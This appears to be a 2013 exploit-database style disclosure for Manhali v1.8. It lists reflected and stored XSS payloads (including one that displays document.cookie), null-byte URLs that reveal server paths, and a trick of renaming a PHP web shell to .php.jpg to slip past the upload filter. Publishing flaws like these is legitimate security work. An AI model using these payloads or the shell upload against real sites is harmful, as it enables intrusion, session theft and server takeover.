############################################
### Exploit Title: Manhali v1.8 multiple Vulnerability's
### Date: Jul 28, 2013
### Author: VipVince
### Vendor Link: http://www.manhali.com/
### Software Link: http://sourceforge.net/projects/manhali/files/manhali_1.8.zip/download
### Version : 1.8
### Tested on: Linux/Windows
############################################

1. Non persistent XSS

Navigate here:

http://localhost/scripts/manhali/users/admin_home.php?inc=users

In the Identifiant/Nom box enter your XSS vector and click search, eg <script>alert(1)</script> .

2. Full path disclosure on two occurrences.

# P.O.C :
 
http://localhost/scripts/manhali/includes/download.php?f=fakefile%00

Warning:
 file_exists() expects parameter 1 to be a valid path, string given in 
C:\Program 
Files\EasyPHP-DevServer-13.1VC9\data\localweb\scripts\manhali\includes\download.php
 on line 49

Also:

http://localhost/scripts/manhali/users/admin_home.php?inc=blah.php%00
 (be sure to include the null byte as that is what throws the error.)

Warning:
 file_exists() expects parameter 1 to be a valid path, string given in 
C:\Program 
Files\EasyPHP-DevServer-13.1VC9\data\localweb\scripts\manhali\users\admin_home.php
 on line 211

3. Persistent/stored XSS:

Navigate to Global 
Configuration, and under "Website title:" add this vector, 
</title><script>alert(document.cookie)</script>

Then visit main page and you will receive your stored XSS.

4. Bypass image upload:

In the admin CP there is several options to upload a picture for your user profile, it instructs us that php type files are disallowed and only those of the gif/jpg format are acceptable. This can be easily bypassed however. Manipulating a PHP shell name to wso.php.jpg and uploading it is enough to bypass the filters and it will inform the user that the upload was successful and can be located in the .docs folder.

 		 	   		  